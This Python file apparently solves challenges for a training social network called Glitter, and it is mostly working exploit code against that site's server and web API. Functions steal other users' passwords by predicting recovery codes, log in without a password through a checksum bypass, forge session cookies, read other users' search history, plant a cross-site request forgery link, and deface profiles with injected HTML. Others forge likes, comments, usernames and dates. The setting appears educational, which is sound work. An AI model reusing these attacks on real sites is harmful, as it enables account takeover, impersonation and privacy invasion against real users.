import socket
import requests
from datetime import datetime
from utilityFunctions import *
import hashlib
SERVER_IP = "54.187.16.171"
WEBSITE_DOMAIN = "http://cyber.glitter.org.il"
SERVER_PORT = 1336

"""
This function adds likes to a specific gilt
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def LikesToGlit(sock, user):
    glits = getUserGlits(sock, user)
    if len(glits["glits"]) == 0:
        print("You don't have any glits!\n")
        return
    print("Please choose what glit you want to add likes to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s (%s)" % (i, glit["content"], glit["date"][:10]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    how_many_likes = int(
        input("Please enter how many likes do you want to add to this glit: "))

    for i in range(how_many_likes):
        data = '710#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##' % (
            glits["glits"][choice - 1]["id"], user["id"], user["user_name"])
        if "Like publish approved" in send_to_server(data,  sock):
            print("Added %d likes" % (i + 1))
        else:
            print("Error adding likes!")


"""
This function adds like to a specific gilt with a different username
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def LikesToGlitDifferentUsername(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add like to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s (%s)" % (i, glit["content"], glit["date"][:10]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    different_username = input(
        "Please enter the username you want to like with: ")

    data = '710#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1}##' % (
        glits["glits"][choice - 1]["id"], user["id"], different_username)
    res = send_to_server(data,  sock)

    if "Like publish approved" in res:
        print("Added a like with username: %s" % (different_username))
    else:
        print("Error adding like!")


"""
This function posts a glit with a different color than the available colors in the app
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postGlitDifferentColor(sock, user):

    glit_content = input("Please enter the new glit content: ")

    color = input(
        "Please enter the color of the glit (It can be any string, even random letters) ")
    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"%s","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], color, user["date"], glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


"""
This function posts a glit with a different avatar than the avatar of the user
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postGlitDifferentAvatar(sock, user):

    glit_content = input("Please enter the new glit content: ")

    avatar = input(
        "Please enter the avatar of the glit (im1, im2.. im8) ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], avatar, user["date"], glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


"""
This function posts a glit with a different date than the current date
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postGlitDifferentDate(sock, user):
    glit_content = input("Please enter the new glit content: ")

    new_date = input(
        "Please enter the new date of the glit (YYYY-MM-DDTHH:MM:SS) ") + ".001Z"

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], new_date, glit_content)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


"""
This function posts a glit with a different font color than the basic black
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postGlitDifferentFontColor(sock, user):
    glit_content = input("Please enter the new glit content: ")

    font_color = input(
        "Please enter font font color of the glit: ")

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color":"White","date":"%s","content":"%s","font_color":"%s","id":-1}##' % (
        user["id"], user["id"], user["screen_name"], user["avatar"], user["date"], glit_content, font_color)

    res = send_to_server(data,  sock)
    if "Glit publish approved" in res:
        print("Successfully created a glit!")
    else:
        print("Couldn't create a glit!")


"""
This function can remove any like, even if it wasn't created by the logged user
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def removeOtherUserLike(sock, user):
    like_id = input("Please enter the like id you want to remove: ")
    data = '720#{gli&&er}%s##' % (like_id)
    res = send_to_server(data,  sock)
    print(res)
    if "725#Unlike publish approved" in res:
        print("Successfully removed this like!")
    else:
        print(res)
        print("Couldn't remove a like! (probably because there isn't a like with that id)")


"""
This function can post a comment with a different date than the current date
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postCommentDifferentDate(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add comment to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s (%s)" % (i, glit["content"], glit["date"][:10]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    comment_content = input(
        "Please enter the content of the comment:")

    comment_date = input(
        "Please enter the different date of the comment (YYYY-MM-DDTHH:MM:SS) ") + ".001Z"

    data = '650#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1,"content":"%s","date":"%s"}##' % (
        glits["glits"][choice - 1]["id"], user["id"], user["screen_name"], comment_content, comment_date)

    res = send_to_server(data,  sock)
    print(res)

    if "655#Comment publish approved" in res:
        print("Added a comment with content: %s" % (comment_content))
    else:
        print("Error adding comment!")


"""
This function can post a comment with a different username than the username of the logged user
@param sock - the open socket with the server
@param user - a dictionary contains information about the logged user
"""


def postCommentDifferentUsername(sock, user):
    glits = getUserGlits(sock, user)
    print("Please choose what glit you want to add comment to: ")

    i = 1
    for glit in glits["glits"]:
        print("\t[%d] - %s (%s)" % (i, glit["content"], glit["date"][:10]))
        i += 1

    choice = int(input(">> "))
    if choice <= 0 or choice > len(glits["glits"]):
        print("Invalid choice!")
        return
    comment_content = input(
        "Please enter the content of the comment:")

    comment_username = input(
        "Please enter the username you want to comment with: ")

    data = '650#{gli&&er}{"glit_id":%d,"user_id":%d,"user_screen_name":"%s","id":-1,"content":"%s","date":"%s"}##' % (
        glits["glits"][choice - 1]["id"], user["id"], comment_username, comment_content, user["date"])

    res = send_to_server(data,  sock)
    print(res)

    if "655#Comment publish approved" in res:
        print("Added a comment with content: %s" % (comment_content))
    else:
        print("Error adding comment!")

# Website Stuff


"""
This function logs in a user in the website
@param username - the username of the user to be logged in
@param password - the password of the user to be logged in
@return a dictionary contains information about the logged user
"""


def loginWebsite(username, password):
    res = requests.post(WEBSITE_DOMAIN +
                        "/user/", headers={"Content-Type": "application/json"}, json=[username, password]).text
    if "Login Failure" in res or res == None:
        print(res)
        return None
    return json.loads(res)


"""
This function asks the user for user credentials and logs them to the app
@param server_sock - the socket with the server
@return a dictionary contains information about the logged user
"""


def getUserAndLogin(server_sock):

    print("please login to your account: ")
    username = input("Enter username: ")
    password = input("Enter password: ")
    account_data = login(username, password, server_sock)
    if account_data == None or account_data == -1:
        print("Error, couldn't login to this account.")
        return -1
    return account_data


"""
This function searches for accounts with a specific userscreennamename
@param account - a dictionary contains information about the logged user
@param screenname - the name to be searched
@return an array contains all the found users
"""


def getUsersWebsite(account, screenname):
    print(account)
    res = json.loads(requests.get(
        WEBSITE_DOMAIN + "/entities?searchType=SIMPLE&searchEntry=" + screenname, cookies={"sparkle": account["sparkle"]}).text)

    return res


def askUserForAccount(socket, name):
    found_users = getUsers(socket, name)
    if "Server Failure" in str(found_users):
        print(found_users)
        print("Error!")
        return
    if len(found_users) == 0:
        print("Cant find any account!")
        return
    i = 1
    for user in found_users:
        print("%d. %s" % (i, user["screen_name"]))
        i += 1
    print("Please choose the user you want: ")
    choice = int(input(">> "))
    if choice <= 0 or choice > len(found_users):
        print("Invalid choice!")
        return
    return found_users[choice - 1]


"""
This function cracks the password of an account
@param socket - the opened socket with the server
@return none
"""


def passwordChallenge(socket):
    print("Hi!\nIn this challenge you will be able to steal other users passwords by giving their usernames!")
    name = input(
        "Please enter the name of the user that you want to steal its password: ")

    found_user = askUserForAccount(socket, name)
    varitification_code = datetime.now().strftime(
        "%d%m" + "".join([chr(int(i) + ord("A")) for i in str(found_user['id'])]) + "%H%M")

    found_user_username = getUsername(socket, found_user['id'])
    res = requests.post(WEBSITE_DOMAIN +
                        "/password-recovery-code-request/", headers={"Content-Type": "application/json"}, json=found_user_username).text
    res = requests.post(WEBSITE_DOMAIN +
                        "/password-recovery-code-verification/", headers={"Content-Type": "application/json"}, json=[found_user_username, varitification_code]).text
    if "Server Failure" in res:
        print(res)
        print("Error, couldn't find the password")
    else:
        print("The password of that account is: " + res)

    send_to_server("200#{gli&&er}%d##" %
                   found_user['id'], socket)  # logging out


"""
This function logs into an account without asking for the password
"""


def loginChallenge():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((SERVER_IP, SERVER_PORT))

    username = input("Please enter the username you want to login: ")
    data = '100#{gli&&er}{"user_name":"%s","password":"saasasasasasaaa","enable_push_notifications":true}##' % (
        username)  # saasasasasasaaa is just a random password, because we want to get the ascii from the server

    res = send_to_server(data, server_sock)
    if "108#Illegal user login. Provided details do not match ascii checksum: " in res:
        required_ascii = int(res[len(
            "108#Illegal user login. Provided details do not match ascii checksum: "): res.index("{gli&&er}")]) - sum([ord(i) for i in username])
        # now, we need to generate a password which its sum of ascii is required_ascii - username.asciisum

        password_with_that_ascii = "d" * \
            (required_ascii // 100) + chr(required_ascii % 100)
        if login(username, password_with_that_ascii, server_sock) == -1:
            print("Failed to login")
        else:
            print("Successfully logged in!")
    else:
        print("Error, couldn't find an account with that username")


"""
This function gets the cookie of a given user
@param socket - the opened socket with the server
"""


def cookieChallenge(socket):
    username = input(
        "Please enter the screen name of the user you want to steal its cookie: ")
    found_user = askUserForAccount(socket, username)
    print("The value of the cookie of that user is: %s" %
          stealCookie(socket, found_user["id"]))


"""
This function calculates the cookie of user, by the user id
@param server_sock - the opened socket with the server
@param id - the id of the user
@return the cookie value

"""


def stealCookie(socket, id):
    found_user_username = getUsername(socket, id)
    username_encrypted = hashlib.md5(found_user_username.encode()).hexdigest()
    cookie_value = datetime.now().strftime(
        "%d%m%Y." + username_encrypted + ".%H%M.%d%m%Y")
    return cookie_value


"""
This function finds the search history of a given user
@param server_sock - the opened socket with the server
"""


def privacyChallenge(server_sock):
    name = input(
        "Please enter the name of the user that you want to watch its history: ")
    found_user = askUserForAccount(server_sock, name)

    users_history = json.loads(requests.get(
        WEBSITE_DOMAIN + "/history/%d" % found_user["id"]).text)
    for i in range(len(users_history)):
        print("%d. %s | ID: %d" %
              (i + 1, users_history[i]["screen_name"], users_history[i]["id"]))


"""
This function posts an button with csrf injection
@param socket - the opened socket with the server
@param account_data - a dictionary contains information about the logged user
"""


def xsrfChallenge(socket, account_data):

    print("In this challenge, we are going to post a glit with a button, and when someone clicks on that button it will post a glit in their proflie")
    btn_content = input(
        "Please enter the content of the button:")
    glit_content = '<a href=\'/glit?id=-1&feed_owner_id=-1&publisher_id=-1&publisher_screen_name=itaybel12&publisher_avatar=im1&background_color=White&date=2022-06-21T10:56:38.410Z&content=THIS GLIT WAS PUBLISHED WITH XSRF&font_color=black\'>%s</a>' % btn_content

    data = '550#{gli&&er}{"feed_owner_id":%d,"publisher_id":%d,"publisher_screen_name":"%s","publisher_avatar":"%s","background_color": "Black","date":"%s","content":"%s","font_color":"black","id":-1}##' % (
        account_data["id"], account_data['id'], account_data['screen_name'],
        account_data['avatar'], account_data['date'], glit_content)

    res = send_to_server(data, socket)


"""
This function adds likes to a glit, by sending http packets
@param account - a dictionary contains information about the logged user
"""


def addLikesToGlitWebsite(account):

    allGlits = json.loads(requests.get(WEBSITE_DOMAIN + "/glits?feedOwnerId=%d&date=%s&count=20" %
                                       (account["user"]["id"], account["user"]["date"]), cookies={"sparkle": account["sparkle"]}).text)
    for i in range(len(allGlits)):
        print("%d. %s (%s)" %
              (i + 1, allGlits[i]["content"], allGlits[i]["date"][0:10]))

    choice = int(input("Please enter which glit you want to add likes to: "))
    if choice < 1 or choice > len(allGlits):
        print("Invalid choice!")
        return
    glit_to_add_likes = allGlits[choice - 1]

    how_many_likes = int(
        input("How many likes do u want to add to this glit: "))
    for i in range(how_many_likes):
        res = requests.post(WEBSITE_DOMAIN + "/likes", cookies={"sparkle": account["sparkle"]}, json={
            "glit_id": glit_to_add_likes["id"], "user_id": account["user"]["id"], "user_screen_name": account["user"]["screen_name"], "id": -1})
        if res.status_code == 200:
            print("Successfully added the %dth like", i)
        else:
            print("Error adding the %dth like", i)


"""
This function posts a glit with a really big image, so it ruins the profile
@param account_data - a dictionary contains information about the logged user
"""


def postGlitWithHugeImage(account_data):
    print("In this challenge you will be able to mess up users profile, by uploading a glit with a really big image.")
    image_url = input(
        "Please enter the url of the image you want to post:")
    name = input(
        "Please enter a name to upload the big image into their profile: ")

    found_users = getUsersWebsite(account_data, name)
    if "Server Failure" in str(found_users):
        print("Error!")
        return
    if len(found_users) == 0:
        print("Cant find any account!")
        return
    i = 1
    for user in found_users:
        print("%d. %s" % (i, user["screen_name"]))
        i += 1
    choice = int(input(">> "))
    if choice <= 0 or choice > len(found_users):
        print("Invalid choice!")
        return
    found_user = found_users[choice - 1]

    user = account_data["user"]
    data = '/glit?id=-1&feed_owner_id=%d&publisher_id=%d&publisher_screen_name=%s&publisher_avatar=%s&background_color=White&date=%s&content=<img width=\'99999999\' height=\'9999999\' src=\'%s\'></img>&font_color=black' % (found_user["id"], user['id'], user['screen_name'],
                                                                                                                                                                                                                               user['avatar'], user['date'], image_url)
    res = requests.get(WEBSITE_DOMAIN + data,
                       cookies={"sparkle": account_data["sparkle"]}).text


"""
This function posts a glit with a different font color by sending http packets
@param account_data - a dictionary contains information about the logged user
"""


def postGlitDifferentFontColorWebsite(account_data):
    font_color = input(
        "Please enter font color: (can be pink, red, and more..)")
    glit_content = input("Please enter the content of the glit: ")
    user = account_data["user"]
    data = '/glit?id=-1&feed_owner_id=%d&publisher_id=%d&publisher_screen_name=%s&publisher_avatar=%s&background_color=White&date=%s&content=%s&font_color=%s' % (user['id'], user['id'], user['screen_name'],
                                                                                                                                                                  user["avatar"], user['date'], glit_content, font_color)
    res = requests.get(WEBSITE_DOMAIN + data,
                       cookies={"sparkle": account_data["sparkle"]}).text


"""
This function sends a glance request and automatiicly accpets it
@param account_data - a dictionary contains information about the logged user
"""


def addFriendWithoutAccepting(account_data):
    name = input(
        "Please enter the name of the username that you want to add to your friends: ")
    found_users = getUsersWebsite(account_data, name)
    if "Server Failure" in str(found_users):
        print("Error!")
        return
    if len(found_users) == 0:
        print("Cant find any account!")
        return
    i = 1
    for user in found_users:
        print("%d. %s" % (i, user["screen_name"]))
        i += 1
    print("Please choose the user you want to add to your friends: ")
    choice = int(input(">> "))
    if choice <= 0 or choice > len(found_users):
        print("Invalid choice!")
        return
    found_user = found_users[choice - 1]
    # first of all, we send the request
    res = requests.post(WEBSITE_DOMAIN + "/glanceship", json={"requester_user_id": account_data["user"]["id"], "responder_user_id": found_user["id"],
                                                              "glanceship_type": "Pending"}, cookies={"sparkle": account_data["sparkle"]}).text
    # then, we accpet the request
    res = requests.post(WEBSITE_DOMAIN + "/glanceship", json={"requester_user_id": account_data["user"]["id"], "responder_user_id": found_user["id"],
                                                              "glanceship_type": "Glanced"}, cookies={"sparkle": account_data["sparkle"]}).text


"""
This function posts a comment on a glit with any date
@param account - a dictionary contains information about the logged user
"""


def postCommentDifferentDateWebsite(account):
    print("Choose what glit do you want to post a comment on: ")
    allGlits = json.loads(requests.get(WEBSITE_DOMAIN + "/glits?feedOwnerId=%d&date=%s&count=20" %
                                       (account["user"]["id"], account["user"]["date"]), cookies={"sparkle": account["sparkle"]}).text)
    for i in range(len(allGlits)):
        print("%d. %s (%s)" %
              (i + 1, allGlits[i]["content"], allGlits[i]["date"][0:10]))

    choice = int(input(">> "))
    if choice < 1 or choice > len(allGlits):
        print("Invalid choice!")
        return
    glit_to_comment = allGlits[choice - 1]

    content = input("Please enter the comment content: ")
    comment_date = input(
        "Please enter the different date of the glit (YYYY-MM-DDTHH:MM:SS) ") + ".001Z"
    res = requests.post(WEBSITE_DOMAIN + "/comments", json={"glit_id": glit_to_comment["id"], "user_id": account["user"]["id"],
                        "user_screen_name": "boody", "id": -1, "content": content, "date": comment_date}, cookies={"sparkle": account["sparkle"]})
